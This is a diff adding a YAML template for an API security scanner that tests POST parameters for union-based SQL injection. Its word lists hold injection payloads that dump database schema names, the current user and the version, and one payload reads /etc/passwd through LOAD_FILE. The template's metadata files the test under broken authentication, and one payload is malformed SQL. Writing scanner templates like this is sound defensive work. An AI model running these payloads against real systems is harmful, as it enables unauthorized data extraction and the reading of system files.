@@ -1,0 +1,198 @@
+id: ADVANCED_UNION_BASED_SQLI_POST
+info:
+  name: "Advanced Union based SQL Injection test with POST method"
+  description: "The Advanced Union-Based SQL Injection Test identifies vulnerabilities where attackers can exploit SQL queries through UNION-based injection techniques. This method involves injecting malicious SQL statements using the `UNION` operator to merge attacker-controlled queries with legitimate ones. The goal is to retrieve sensitive data, such as database schema details, user credentials, or application secrets. Preventing this vulnerability requires robust input validation, parameterized queries, and secure database interaction practices."
+  details: "The Advanced Union-Based SQL Injection Test focuses on detecting SQL injection flaws that leverage the `UNION` operator to append malicious queries. By combining attacker-controlled queries with legitimate SQL queries, sensitive data like database tables, columns, or user credentials can be exposed. This test checks for input fields or parameters that accept user input without proper sanitization or validation, making them vulnerable to this type of injection. Mitigation strategies include using parameterized queries, prepared statements, and rigorous input validation to block unauthorized SQL query execution."
+  impact: "The impact of an Advanced Union-Based SQL Injection vulnerability can be critical, allowing attackers to retrieve sensitive information, such as user credentials, financial data, or application secrets, directly from the database. This can lead to unauthorized access, data breaches, and potential compliance violations. Additionally, attackers could escalate their privileges or further exploit the database and underlying system. Implementing secure coding practices and robust database query mechanisms is essential to mitigate such risks."
+
+  category:
+    name: NO_AUTH
+    shortName: Broken Authentication
+    displayName: Broken User Authentication (BUA)
+  subCategory: ADVANCED_UNION_BASED_SQLI_POST
+  severity: MEDIUM
+  tags:
+    - Business logic
+    - OWASP top 10
+    - HackerOne top 10
+  references:
+    - "https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/"
+    - "https://github.com/OWASP/API-Security/blob/master/editions/2023/en/0xa2-broken-authentication.md"
+    - "https://cheatsheetseries.owasp.org/cheatsheets/Authentication_Cheat_Sheet.html"
+  cwe:
+    - CWE-287
+  cve:
+    - CVE-2020-24008
+    - CVE-2021-45901
+
+api_selection_filters:
+  response_code:
+    gte: 200
+    lt: 300
+  method:
+    eq: POST
+  response_payload:
+    length:
+      gt: 0
+    not_contains:
+      - Error
+      - Internal Server 
+      - Failed
+      - Unauthorized
+      - access denied
+      - Forbidden
+      - Method Not allowed
+      - Gateway timeout
+      - request timeout
+      - server error
+      - server busy
+      - authentication error
+      - authorization error
+      - validation error
+      - Permission Denied
+      - invalid token
+      - token expired
+      - session expired
+      - session timeout
+      - unexpected error
+      - unable to process request
+      - bad request
+      - service unavailable
+      - account is locked
+      - account is blocked
+      - multiple failed attempts
+      - <html>
+      - </html>
+  request_payload:
+    for_one:
+      key:
+        regex: ".*"
+        extract: userKey
+      value:
+        extract: userVal
+wordLists:
+  unionBasedPayloads:
+    - "' UNION SELECT table_name, null FROM information_schema.tables--"
+    - "' UNION SELECT column_name, null FROM information_schema.columns WHERE table_name='users'--"
+    - "' UNION SELECT table_name, column_name FROM information_schema.columns--"
+    - "' UNION SELECT database(), null--"
+    - "' UNION SELECT user(), null--"
+    - "' UNION SELECT @@version, null--"
+    - "' UNION SELECT schema_name, null FROM information_schema.schemata--"
+    - "' UNION SELECT 1, LOAD_FILE('/etc/passwd')--"
+  unionNegativeBasedPayloads:
+    - "' UNION SELECT table_name, null FROM information_schema.tables WHERE 1=0--"
+    - "' UNION SELECT column_name, null FROM information_schema.columns WHERE table_name='users' WHERE 1=0--"
+    - "' UNION SELECT table_name, column_name FROM information_schema.columns WHERE 1=0--"
+    - "' UNION SELECT database(), null WHERE 1=0--"
+    - "' UNION SELECT user(), null WHERE 1=0--"
+    - "' UNION SELECT @@version, null WHERE 1=0--"
+    - "' UNION SELECT schema_name, null FROM information_schema.schemata WHERE 1=0--"
+    - "' UNION SELECT 1, LOAD_FILE('/etc/passwd') WHERE 1=0--"  
+execute:
+  type: multiple
+  requests:
+  - req:
+    - modify_body_param:
+        userKey: ${userVal}${unionBasedPayloads}
+    - validate:
+        response_code:
+          gte: 200
+          lt: 300
+        response_payload:
+          length:
+            gt: 0
+          contains_either:
+            - "table_name"
+            - "column_name"
+            - "database"
+            - "schema_name"
+            - "root:"
+          not_contains:
+            - Error
+            - Internal Server 
+            - Failed
+            - Unauthorized
+            - access denied
+            - Forbidden
+            - Method Not allowed
+            - Gateway timeout
+            - request timeout
+            - server error
+            - server busy
+            - authentication error
+            - authorization error
+            - validation error
+            - Permission Denied
+            - invalid token
+            - token expired
+            - session expired
+            - session timeout
+            - unexpected error
+            - unable to process request
+            - bad request
+            - service unavailable
+            - account is locked
+            - account is blocked
+            - multiple failed attempts
+            - Attention Required!
+            - CloudFlare
+            - Sorry, you have been blocked
+            - UNION
+            - SELECT 
+            - <html>
+            - </html>          
+    - success: x2
+    - failure: exit
+  - req:
+    - modify_body_param:
+        userKey: ${userVal}${unionNegativeBasedPayloads}
+    - validate:
+        response_code:
+          gte: 200
+          lt: 300
+        response_payload:
+          length:
+            gt: 0  
+          not_contains:
+            - Error
+            - Internal Server 
+            - Fail
+            - Unauthorized
+            - access denied
+            - Forbidden
+            - Method Not allowed
+            - Gateway timeout
+            - request timeout
+            - server error
+            - server busy
+            - authentication error
+            - authorization error
+            - validation error
+            - Permission Denied
+            - invalid token
+            - token expired
+            - session expired
+            - session timeout
+            - unexpected error
+            - unable to process request
+            - bad request
+            - service unavailable
+            - account is locked
+            - account is blocked
+            - multiple failed attempts  
+            - Attention Required!
+            - CloudFlare
+            - Sorry, you have been blocked 
+            - UNION
+            - SELECT
+            - "table_name"
+            - "column_name"
+            - "database"
+            - "schema_name"
+            - "root:"
+            - <html>
+            - </html>
+          neq: "${x1.response.body}"
+    - success: vulnerable
+    - failure: exit
